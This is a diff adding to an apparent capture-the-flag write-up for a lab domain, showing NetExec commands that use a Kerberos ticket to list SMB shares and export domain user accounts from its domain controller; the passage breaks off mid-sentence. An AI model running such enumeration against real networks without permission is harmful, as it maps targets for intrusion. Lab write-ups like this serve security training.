@@ -103,5 +103,40 @@ export KRB5CCNAME=p_rosa.tgt.ccache
 ```
 ## Shares
 ```python
-
+nxc smb dc01.vintage.htb --use-kcache --shares                                      
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE.HTB\p.rosa from ccache 
+SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
+SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
+SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
+SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
+SMB         dc01.vintage.htb 445    dc01             C$                              Default share
+SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
+SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
+SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
 ```
+Read access on default shares
+## Users
+```python
+nxc smb dc01.vintage.htb --use-kcache --users-export users.txt
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] VINTAGE.HTB\p.rosa from ccache 
+SMB         dc01.vintage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         dc01.vintage.htb 445    dc01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain
+SMB         dc01.vintage.htb 445    dc01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain
+SMB         dc01.vintage.htb 445    dc01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account
+SMB         dc01.vintage.htb 445    dc01             M.Rossi                       2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             R.Verdi                       2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             L.Bianchi                     2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             G.Viola                       2024-06-05 13:31:08 0        
+SMB         dc01.vintage.htb 445    dc01             C.Neri                        2024-06-05 21:08:13 0        
+SMB         dc01.vintage.htb 445    dc01             P.Rosa                        2024-11-06 12:27:16 0        
+SMB         dc01.vintage.htb 445    dc01             svc_sql                       2026-04-02 15:32:15 0        
+SMB         dc01.vintage.htb 445    dc01             svc_ldap                      2024-06-06 13:45:27 0        
+SMB         dc01.vintage.htb 445    dc01             svc_ark                       2024-06-06 13:45:27 0        
+SMB         dc01.vintage.htb 445    dc01             C.Neri_adm                    2024-06-07 10:54:14 0        
+SMB         dc01.vintage.htb 445    dc01             L.Bianchi_adm                 2024-11-26 11:40:30 0        
+SMB         dc01.vintage.htb 445    dc01             [*] Enumerated 14 local users: VINTAGE
+SMB         dc01.vintage.htb 445    dc01             [*] Writing 14 local users to users.txt
+```
+Dumped al
